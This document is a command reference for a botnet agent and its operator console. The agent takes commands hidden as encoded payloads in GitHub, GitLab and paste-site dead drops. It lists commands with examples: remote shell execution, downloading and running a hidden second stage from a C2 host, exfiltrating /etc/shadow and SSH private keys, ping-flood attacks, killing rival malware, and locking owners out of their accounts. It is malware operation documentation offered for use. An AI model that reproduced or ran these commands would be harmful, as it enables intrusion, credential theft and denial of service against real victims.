# Command Reference

## Agent Commands (FBI Format)

Commands are delivered to agents via ZW-encoded payloads in dead-drop READMEs.
Multiple commands can be queued and pushed as a batch. Command hash deduplication
prevents re-execution of duplicate batches.

### Shell Execution

```
cmd <shell command>
shell <shell command>
```

Executes the given command via `sh -c` (Linux/macOS) or `cmd /C` (Windows).
Output is captured and truncated to 1MB. Timeout: 60 seconds.

Examples:
```
cmd whoami
shell cat /etc/passwd
cmd ls -la /tmp/
```

### File Download

```
download <url> <dest> [RUN] [HIDE]
```

Downloads a file from a URL to a destination path. Optional flags:
- `RUN` — Execute the file after download (Unix: sets 755, Windows: uses `start`)
- `HIDE` — Hide the file (Windows: `attrib +H`, Unix: renames to dotfile)

Examples:
```
download http://c2.example.com/stage2 /tmp/.sshd RUN HIDE
download https://example.com/config /etc/cron.d/backup
```

### File Exfiltration

```
upload <local_path> [<url>]
exfil <local_path> [<url>]
```

Reads a local file and sends it to a URL via HTTP POST. If no URL is provided,
returns file contents inline. Files larger than 1MB return a truncated preview.
Data is ZW-encrypted before upload.

Examples:
```
upload /etc/shadow https://c2.example.com/exfil
exfil /home/user/.ssh/id_rsa
```

### Denial of Service

```
dos <target> <seconds>
```

Launches a ping flood (`ping -f`) against a target. Capped at 300 seconds.
Runs as a detached background process.

Example:
```
dos 192.168.1.1 60
```

### Popup Message

```
popmsg <message>
```

Displays a message in the default browser via a temporary HTML file.
Cross-platform (xdg-open, open, rundll32). HTML file is cleaned up after 30 seconds.

Example:
```
popmsg System maintenance in progress
```

### Agent Control

```
sleep <seconds>
```

Pauses the agent for the specified duration. Capped at 3600 seconds (1 hour).

```
set_interval <seconds>
```

Changes the poll interval. Minimum: 10 seconds.

```
add_repo <spec>
```

Adds a new dead-drop repo to the agent's polling list. Supports comma-separated specs.
Format: `[gh:|gl:|dp:]owner/repo[:branch[/file_path]]`

Examples:
```
add_repo gh:backup-org/fallback-repo:main
add_repo gl:my-group/c2-backup:develop
add_repo dp:abc12345
```

```
set_key <64 hex chars>
```

Updates the session key for ZW-encrypted heartbeat responses. Triggers marker
set rotation so the agent can read payloads encrypted with the new key.

```
die
```

Immediately terminates the agent process. No cleanup.

### Malware Removal

```
serialkiller [RUN]
```

Kills 50+ known competitor malware processes via `killall -9` and `pkill -f`,
plus blocks 13 common malware ports via `iptables`. With the `RUN` flag, also
wipes user crontabs and `/tmp/` directories.

```
cmd <permakill script>
```

Full credential lockdown: changes all user passwords, locks root, deletes SSH
authorized_keys, disables telnetd. Generate via the dashboard's Attack Studio.

## Operator CLI Commands

The `arcticfox-control` binary provides an interactive shell (`ctrl>` prompt)
for direct dead-drop management:

| Command | Description |
|---------|-------------|
| `add <spec>` | Add dead-drop repo |
| `rm <index>` | Remove repo at 1-based index |
| `repos` | List all repos with health status |
| `check` | HEAD-check all repos |
| `cmd <command>` | Add command to queue |
| `cmds` | List queued commands |
| `rm_cmd <index>` | Remove command at 1-based index |
| `clear` | Clear all commands |
| `push [index]` | Push payload to all alive repos (or specific one) |
| `pull <index>` | Fetch and decode ZW payload from repo |
| `preview` | Preview the JSON payload before pushing |
| `paste` | Create Debian paste dead-drop |
| `pad` | Toggle ZW padding |
| `hb_redirect <url>` | Set heartbeat redirect URL |
| `hb_tracking <url>` | Set heartbeat tracking URL |
| `hb_interval <sec>` | Set heartbeat interval |
| `gh_token <token>` | Set GitHub token |
| `gl_token <token>` | Set GitLab token |
| `status` | Summary of bot/repo/command/padding state |
| `save` | Save config to disk |
| `help` | Show help |
